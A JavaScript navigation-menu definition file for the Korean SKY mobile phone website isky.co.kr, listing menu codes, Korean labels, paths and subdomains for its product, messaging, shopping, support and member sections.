/**************************************************************************
*	메뉴관련 링크 및 Location 관련
**************************************************************************/
try{ if(_undefined_domain){}else{ throw new Error("도메인세팅"); } }catch(e){ document.domain = "isky.co.kr"; }

var menuArr = new Array();
var m = 0;

// iSKY Home
menuArr[m++] = new Array('00', 'Home','/index.jsp', 'http://www.isky.co.kr');

// Global Navi
// [ ] Product
menuArr[m++] = new Array('01', 'THE 스카이','/product/index.sky', 'http://www.isky.co.kr');

// SKT
menuArr[m++] = new Array('0101', 'SKT','/product/product.sky?telCode=SKT', 'http://www.isky.co.kr');

// KTF
menuArr[m++] = new Array('0102', 'KTF','/product/product.sky?telCode=KT', 'http://www.isky.co.kr');

// LGT
menuArr[m++] = new Array('0103', 'LGT','/product/product.sky?telCode=LGT', 'http://www.isky.co.kr');

// MVNO
//menuArr[m++] = new Array('0104', 'MVNO','/product/product.sky?telCode=MVNO', 'http://www.isky.co.kr');

// SKY 리뷰
menuArr[m++] = new Array('0104', '사용자 리뷰','/product/review/review.sky', 'http://www.isky.co.kr');

// MUST HAVE_
menuArr[m++] = new Array('0105', 'MUST HAVE_','/product/musthave/index.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('010501', '광고갤러리','/product/musthave/ad/tv.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050101', 'TV광고','/product/musthave/ad/tv.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050102', '인쇄광고','/product/musthave/ad/print.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050103', '벨소리쿠폰','/product/musthave/ad/coupon.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050104', '라디오광고','/product/musthave/ad/radio.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('010502', 'PC Accessory','/product/musthave/acc/wallpaper.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050201', 'WallPaper','/product/musthave/acc/wallpaper.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050202', 'Screen Saver','/product/musthave/acc/screenSaver.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050203', 'Messenger이모티콘','/product/musthave/acc/emoticon.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('01050204', 'Messenger공개사진','/product/musthave/acc/picture.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('010503', 'SKY VI','/product/musthave/vi/vi.sky', 'http://www.isky.co.kr');

// 스타폰경매
menuArr[m++] = new Array('0106','스타폰 경매','/product/auction/auction_2011.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('010601','지난 경매','/product/auction/auction_2011.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060101','2011년 경매','/product/auction/auction_2011.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060102','2010년 경매','/product/auction/auction_2010.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060103','2009년 경매 하반기','/product/auction/auction_200902.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060104','2009년 경매 상반기','/product/auction/auction_2009.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060105','2008년 경매','/product/auction/auction_2008.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060106','2007년 경매','/product/auction/auction_2007.sky','http://www.isky.co.kr');
menuArr[m++] = new Array('01060107','2006년 경매','/product/auction/auction_2006.sky','http://www.isky.co.kr');



// [ ] SMS
menuArr[m++] = new Array('02', 'doM', '/index.jsp', 'http://message.isky.co.kr');

menuArr[m++] = new Array('0201', '스토리메시지', '/story/love.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020101', '연애문자기술연구소', '/story/love.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02010101', '문자 기술 보고서', '/story/love.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02010102', '연구소 소개', '/story/lab.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('020102', 'M 스토리 태그', '/story/storytag.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02010201', '스토리 태그', '/story/storytag.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02010202', '단문 태그', '/story/shorttag.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('0202', '메시지캐스트', '/cast/stardiary_withstar_list.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('020201', '스타다이어리', '/cast/stardiary_withstar_list.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02020101', '함께하는 스타', '/cast/stardiary_withstar_list.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('02020102', '오픈 다이어리', '/cast/stardiary_open_list.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('020202', '투데이메시지', '/cast/islandtoday_today.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020203', '테마메시지', '/cast/theme.sky', 'http://message.isky.co.kr');

//menuArr[m++] = new Array('0203', 'M-BOOK', '/book/messagebook.sky', 'http://message.isky.co.kr');
//menuArr[m++] = new Array('020301', 'M-BOOK 이란?', '/book/messagebook.sky', 'http://message.isky.co.kr');
//menuArr[m++] = new Array('020302', 'M-BOOK 만들기', '/book/mbookList.sky', 'http://message.isky.co.kr');
//menuArr[m++] = new Array('020303', 'M-BOOK 갤러리', '/book/gallery/bookGalleryList.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('0204', 'MY MESSAGE', '/info/live.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020401', 'Live 메시지안내', '/info/live.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020402', '스타다이어리안내', '/info/stardiary.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020403', '투데이메시지안내', '/info/today.sky', 'http://message.isky.co.kr');
menuArr[m++] = new Array('020404', '테마메시지안내', '/info/theme.sky', 'http://message.isky.co.kr');

menuArr[m++] = new Array('0203', '메시지박스', '/guest.sky?kind=messagebox', 'http://message.isky.co.kr');
menuArr[m++] = new Array('0206', '스케줄러', '/guest.sky?kind=scheduler', 'http://message.isky.co.kr');
menuArr[m++] = new Array('0207', '주소록', '/guest.sky?kind=addressbook', 'http://message.isky.co.kr');



// [ ] FUN
menuArr[m++] = new Array('03', 'FUN', '/fun/index.jsp', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0301', '히어로즈', '/fun/heros/heros.sky?intSeq=0', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('0302', '스카이데뷔', '/fun/debut/debut.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0303', '웹툰', '/fun/cartoon/cartoon.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030301', '월요툰', '/fun/cartoon/cartoon_list.sky?strCode=37008', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030302', '수요툰', '/fun/cartoon/cartoon_list.sky?strCode=37009', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030303', '금요툰', '/fun/cartoon/cartoon_list.sky?strCode=37006', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0304', '플래시게임', '/fun/game/game.sky?intSeq=0', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0305', '타로카드', '/fun/tarot/fortune.sky?strCode=40001', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030501', '오늘의운세', '/fun/tarot/fortune.sky?strCode=40001', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030502', '당신의미래', '/fun/tarot/future.sky?strCode=40002', 'http://www.isky.co.kr');
menuArr[m++] = new Array('030503', '심리테스트', '/fun/tarot/mental.sky?strCode=40003', 'http://www.isky.co.kr');


// [ ] Mall
menuArr[m++] = new Array('04', 'MALL', '/index.sky?pageCode=3', 'http://www.isky.co.kr');

// 엠가온
menuArr[m++] = new Array('0401', '다운로드샵', '/mobile/index.jsp', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040101', 'ONLY 스카이', '/mobile/onlysky/index.jsp?dispNum=040101', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010101', '라디오쿠폰 벨소리', '/mobile/onlysky/radiocoupon/list.jsp?dispNum=04010101', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010102', '스타일배경화면', '/mobile/onlysky/stylescreen/list.jsp?dispNum=04010102', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040102', '벨소리', '/mobile/bell/index.jsp?dispNum=040102', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010201', '인기 TOP 100', '/mobile/bell/sound/list.jsp?dispNum=04010201', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010202', '최신 벨소리', '/mobile/bell/sound/list.jsp?dispNum=04010202', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010203', '테마 앨범', '/mobile/bell/sound/album.jsp?dispNum=04010203', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010204', '가요/트로트', '/mobile/bell/sound/list.jsp?dispNum=04010204', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010205', '영화/드라마/CF', '/mobile/bell/sound/list.jsp?dispNum=04010205', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010206', 'POP/월드뮤직', '/mobile/bell/sound/list.jsp?dispNum=04010206', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010207', '클래식/뉴에이지', '/mobile/bell/sound/list.jsp?dispNum=04010207', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010208', '만화/게임/동요', '/mobile/bell/sound/list.jsp?dispNum=04010208', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010209', 'CCM/종교', '/mobile/bell/sound/list.jsp?dispNum=04010209', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040102010', '패러디/코믹/멘트', '/mobile/bell/sound/list.jsp?dispNum=040102010', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040102011', '동영상벨', '/mobile/bell/sound/livebell.jsp?dispNum=040102011', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040102012', '앨범 쇼케이스', '/mobile/bell/sound/album.jsp?dispNum=040102012', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040103', '통화연결음', '/mobile/ring/index.jsp?dispNum=040103', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010301', '인기 TOP 100', '/mobile/ring/connec/list.jsp?dispNum=04010301', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010302', '최신 통화연결음', '/mobile/ring/connec/list.jsp?dispNum=04010302', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010303', '영화/드라마/CF', '/mobile/ring/connec/list.jsp?dispNum=04010303', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010304', '최신인기가요', '/mobile/ring/connec/list.jsp?dispNum=04010304', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010305', '팝/마니아', '/mobile/ring/connec/list.jsp?dispNum=04010305', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010306', '만화/동요/멘트', '/mobile/ring/connec/list.jsp?dispNum=04010306', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040104', '배경화면', '/mobile/screen/index.jsp?dispNum=040104', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010401', '최신 바탕화면', '/mobile/screen/scene/list.jsp?dispNum=04010401', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010402', '인기 바탕화면', '/mobile/screen/scene/list.jsp?dispNum=04010402', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010403', '예쁜/사랑', '/mobile/screen/scene/list.jsp?dispNum=04010403', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010404', '코믹/패러디', '/mobile/screen/scene/list.jsp?dispNum=04010404', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010405', '파이팅/축하/감사', '/mobile/screen/scene/list.jsp?dispNum=04010405', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010406', '달력/시즌/데이', '/mobile/screen/scene/list.jsp?dispNum=04010406', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010407', '포토/풍경', '/mobile/screen/scene/list.jsp?dispNum=04010407', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('04010408', '라이브스크린', '/mobile/screen/scene/list.jsp?dispNum=04010408', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040105', '게임존', '/mobile/gamezone/index.jsp?dispNum=040105', 'http://mobile.isky.co.kr');
menuArr[m++] = new Array('040106', '문자', '/mobile/sms/index.jsp?dispNum=040106', 'http://mobile.isky.co.kr');

menuArr[m++] = new Array('0402', '스카이액세서리', '/accessory/index.asp', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040201', '이어폰', '/accessory/accessoryList.asp?cate=165', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040202', '충전기', '/accessory/accessoryList.asp?cate=166', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040203', '배터리', '/accessory/accessoryList.asp?cate=167', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040204', '거치대', '/accessory/accessoryList.asp?cate=168', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040205', '젠더', '/accessory/accessoryList.asp?cate=208', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040206', '케이블', '/accessory/accessoryList.asp?cate=169', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040207', '배터리케이스', '/accessory/accessoryList.asp?cate=207', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040208', '터치펜', '/accessory/accessoryList.asp?cate=211', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040209', '파우치', '/accessory/accessoryList.asp?cate=209', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040210', '기타',   '/accessory/accessoryList.asp?cate=170', 'http://store.isky.co.kr');


menuArr[m++] = new Array('0403', '스페셜 샵', '/special/index.asp', 'http://store.isky.co.kr');  
menuArr[m++] = new Array('040301', 'Best', '/special/shoppingHouse_list.asp?category=best', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040302', 'Sale', '/special/shoppingHouse_list.asp?category=sale', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040303', 'New', '/special/shoppingHouse_list.asp?category=new', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040304', 'Only 스카이', '/special/shoppingHouse_list.asp?category=sky', 'http://store.isky.co.kr');

menuArr[m++] = new Array('040305', 'Hobby', '/special/shoppingHouse_list.asp?category=hobby', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030501', '킨키로봇', '/special/shoppingHouse_list.asp?category=hobby&subcate=A0', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030502', '토이카메라', '/special/shoppingHouse_list.asp?category=hobby&subcate=A1', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030503', '기타', '/special/shoppingHouse_list.asp?category=hobby&subcate=A2', 'http://store.isky.co.kr');


menuArr[m++] = new Array('040306', 'Digital', '/special/shoppingHouse_list.asp?category=digital', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030601', '노트북', '/special/shoppingHouse_list.asp?category=digital&subcate=B3', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030602', '전자사전', '/special/shoppingHouse_list.asp?category=digital&subcate=B4', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030603', '케이스/파우치', '/special/shoppingHouse_list.asp?category=digital&subcate=B5', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030604', '이어폰/헤드폰', '/special/shoppingHouse_list.asp?category=digital&subcate=B6', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030605', '스피커', '/special/shoppingHouse_list.asp?category=digital&subcate=B7', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030606', '마우스', '/special/shoppingHouse_list.asp?category=digital&subcate=B8', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030607', '라디오', '/special/shoppingHouse_list.asp?category=digital&subcate=B9', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030608', '기타', '/special/shoppingHouse_list.asp?category=digital&subcate=B10', 'http://store.isky.co.kr');

menuArr[m++] = new Array('040307', 'Living', '/special/shoppingHouse_list.asp?category=living', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030701', '디자인문구', '/special/shoppingHouse_list.asp?category=living&subcate=C11', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030702', '고급문구', '/special/shoppingHouse_list.asp?category=living&subcate=C12', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030703', '디자인생활용품', '/special/shoppingHouse_list.asp?category=living&subcate=C13', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030704', '디자인시계', '/special/shoppingHouse_list.asp?category=living&subcate=C14', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030705', '여가/여행용품', '/special/shoppingHouse_list.asp?category=living&subcate=C15', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030706', '시즌용품', '/special/shoppingHouse_list.asp?category=living&subcate=C16', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030707', '기타', '/special/shoppingHouse_list.asp?category=living&subcate=C17', 'http://store.isky.co.kr');

menuArr[m++] = new Array('040308', '휴대폰액세서리', '/special/shoppingHouse_list.asp?category=phone', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030801', '휴대폰보호필름', '/special/shoppingHouse_list.asp?category=phone&subcate=D18', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030802', '휴대폰케이스', '/special/shoppingHouse_list.asp?category=phone&subcate=D19', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030803', '핸드스트랩', '/special/shoppingHouse_list.asp?category=phone&subcate=D20', 'http://store.isky.co.kr');
menuArr[m++] = new Array('04030804', '기타', '/special/shoppingHouse_list.asp?category=phone&subcate=D21', 'http://store.isky.co.kr');

menuArr[m++] = new Array('040309', '테마갤러리', '/special/theme.asp', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040310', '스카이초이스', '/special/choice_view.asp', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040311', '판매자 상품보기', '/special/shoppingHouse_list.asp?category=manager', 'http://store.isky.co.kr');

menuArr[m++] = new Array('040312', '장바구니', '/basket/index.asp', 'http://store.isky.co.kr');
menuArr[m++] = new Array('040313', '주문/배송조회', '/basket/index.asp', 'http://www.isky.co.kr');

menuArr[m++] = new Array('0404', '쇼핑', '/basket/index.asp', 'http://www.isky.co.kr');
menuArr[m++] = new Array('040401', '장바구니', '/basket/index.asp', 'http://store.isky.co.kr');


// [ ] Support
//menuArr[m++] = new Array('05', 'SKY 고객지원', '/LoginProc.jsp?goURL=main.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('05', 'SKY 고객지원', '/', 'http://www.skyservice.co.kr');

menuArr[m++] = new Array('0501', '자주찾는 도움말', '/LoginProc.jsp?goURL=jsp/dgns/FaqList.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('050101', '온라인 상담', '/LoginProc.jsp?goURL=jsp/counsel/CounSelList.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('0502', 'S/W다운로드', '/LoginProc.jsp?goURL=jsp/info/DownSW.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('050201', '셀프업그레이드', '/LoginProc.jsp?goURL=jsp/info/selfUpgrade.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('050202', '소프트웨어', '/LoginProc.jsp?goURL=jsp/info/DownSW.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('0503', '서비스센터', '/LoginProc.jsp?goURL=jsp/rsrv/findPluszone.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('050301', '서비스센터안내', '/LoginProc.jsp?goURL=jsp/rsrv/findPluszone.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('050302', '서비스규정안내', '/LoginProc.jsp?goURL=jsp/rsrv/ServInfo.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('05030201', '교환/환불', '/cs/exchange.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('05030202', 'OK캐쉬백 사용안내', '/cs/okcashbag.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('050303', '서비스안내', '/cs/service.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0504', '고객제안', '/LoginProc.jsp?goURL=jsp/prpl/PrplRgst.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('0505', '고객제안', 'javascript:go_sinmungo()', '');


// [ ] Member
menuArr[m++] = new Array('06', 'Member','/member/rank.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('0601', '로그인','/login.sky?p_url=http://www.isky.co.kr', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('0602', '회원가입','/member/agreement.sky', 'https://www.isky.co.kr');
menuArr[m++] = new Array('0602', '회원가입','/member/agreement.sky', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('0603', '아이디/비밀번호 찾기','/member/idpassfind.sky', 'https://www.isky.co.kr');
menuArr[m++] = new Array('0603', '아이디/비밀번호 찾기','/member/idpassfind.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0604', '회원등급안내','/member/rank.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0605', '활동포인트안내','/member/info_save.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('060501', '포인트 적립방법','/member/info_save.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('060502', '포인트 사용방법','/member/info_use.sky', 'http://www.isky.co.kr');


// [ ] MyIsky
menuArr[m++] = new Array('07', 'My iSKY','/myisky/index.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0701', 'My iSKY','/myisky/index.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070101', '회원정보수정','/myisky/basis.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07010101', '기본정보','/myisky/basis.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07010102', '부가정보','/myisky/addition.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07010103', '회원탈퇴','/myisky/withdrawal.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070102', '휴대폰 등록/수정','/myisky/myPhoneView.sky', 'http://www.isky.co.kr');//내폰리스트 없는듯합니다.
menuArr[m++] = new Array('070103', 'My 사용자 리뷰','/myisky/myContents.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070104', 'My 고객지원','/LoginProc.jsp?goURL=jsp/counsel/CounSelList.jsp', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('07010401', '온라인 상담','/LoginProc.jsp?goURL=jsp/counsel/CounSelList.jsp ', 'http://cs.isky.co.kr');
menuArr[m++] = new Array('07010402', '고객제안','/LoginProc.jsp?goURL=jsp/prpl/PrplRgst.jsp', 'http://cs.isky.co.kr');

menuArr[m++] = new Array('0702', 'My 메세지','/myisky/mymessage/starDiary.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070201', '서비스 이용내역','/myisky/mymessage/starDiary.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07020101', '스타다이어리','/myisky/mymessage/starDiary.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07020102', '테마메시지','/myisky/mymessage/themeMessage.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070202', '모바일 전송내역','/myisky/mymessage/sms.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07020201', '일반문자','/myisky/mymessage/sms.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07020202', '스케줄러 일정알림','/myisky/mymessage/schedule.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('0703', 'My 스토어','/myisky/mystore/myDownload.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070301', '폰꾸미기 내역','/myisky/mystore/myDownload.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070302', '주문내역','/myisky/mystore/myOrder_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030201', '주문/배송현황','/myisky/mystore/myOrder_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020101', '액세서리샵','/myisky/mystore/myOrder_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020102', '스페셜샵','/myisky/mystore/myOrder_special.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030202', '주문수정','/myisky/mystore/myOrder_edit_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020201', '액세서리샵','/myisky/mystore/myOrder_edit_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020202', '스페셜샵','/myisky/mystore/myOrder_edit_special.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030203', '주문취소','/myisky/mystore/myOrder_cancel_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020301', '액세서리샵','/myisky/mystore/myOrder_cancel_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0703020302', '스페셜샵','/myisky/mystore/myOrder_cancel_special.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070303', '반품/교환신청','/myisky/mystore/myOrder_return_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030301', '액세서리샵','/myisky/mystore/myOrder_return_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030302', '스페셜샵','/myisky/mystore/myOrder_return_special.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070304', '거래증빙자료신청','/myisky/myBill_tax.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030401', '세금계산서 신청/조회','/myisky/myBill_tax.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030402', '현금영수증 조회','/myisky/myBill_cash.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030403', '신용카드영수증 조회','/myisky/myBill_card.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070305', '관심내역','/myisky/mystore/myWish_download.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030501', '폰꾸미기','/myisky/mystore/myWish_download.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030502', '스카이액세서리','/myisky/mystore/myWish_accessory.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07030503', '스페셜샵','/myisky/mystore/myWish_special.sky', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('070306', 'A/S 신청','/myisky/mystore/myAs.sky', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('07030601', 'A/S 신청하기','/myisky/mystore/myAs.sky', 'http://www.isky.co.kr');
//menuArr[m++] = new Array('07030602', 'A/S 처리내역','/myisky/mystore/myAs_result.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070306', '상품문의내역','/myisky/mystore/myQa.sky', 'http://www.isky.co.kr');

menuArr[m++] = new Array('0704', 'My 통장','/myisky/mybank/point.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070401', 'My 포인트','/myisky/mybank/point.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040101', '포인트 내역','/myisky/mybank/point.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010101', '전체','/myisky/mybank/point.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010102', '적립포인트','/myisky/mybank/point_save.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010103', '사용포인트','/myisky/mybank/point_use.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040102', '포인트 안내','/myisky/mybank/info_save.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010201', '포인트 적립방법','/myisky/mybank/info_save.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010202', '포인트 사용방법','/myisky/mybank/info_use.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040103', '활동지수 적립금 안내','/myisky/mybank/ex_acti.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010301', '활동지수 전환하기','/myisky/mybank/ex_acti.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0704010302', '적립금 전환하기','/myisky/mybank/ex_reserve.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070402', 'My 캐쉬','/myisky/mybank/cash.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040201', '전체','/myisky/mybank/cash.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040202', '충전캐쉬','/myisky/mybank/cash_fill.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('07040203', '사용캐쉬','/myisky/mybank/cash_use.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('070403', 'My 쿠폰','/myisky/mybank/mycoupon.sky', 'http://www.isky.co.kr');


// [ ] Notice
menuArr[m++] = new Array('08', '공지사항','/etc/notice.sky', 'http://www.isky.co.kr');


// [ ] Event
menuArr[m++] = new Array('09', '이벤트','/etc/event.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0901', '진행중인 이벤트','/etc/event.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0902', '지난 이벤트','/etc/event_end.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('0903', '당첨자발표','/etc/event_prize.sky', 'http://www.isky.co.kr');


// [ ] 사이트안내
menuArr[m++] = new Array('10', '사이트안내','/etc/agreement_site.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('1001', '이용약관','/etc/agreement_site.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('100101', '사이트 이용약관','/etc/agreement_site.sky', 'http://www.isky.co.kr');
menuArr[m++] = new Array('100102', '유료서비스 이용약관','/etc/agreement_contents.sky', 'http://www.isky.co.kr');
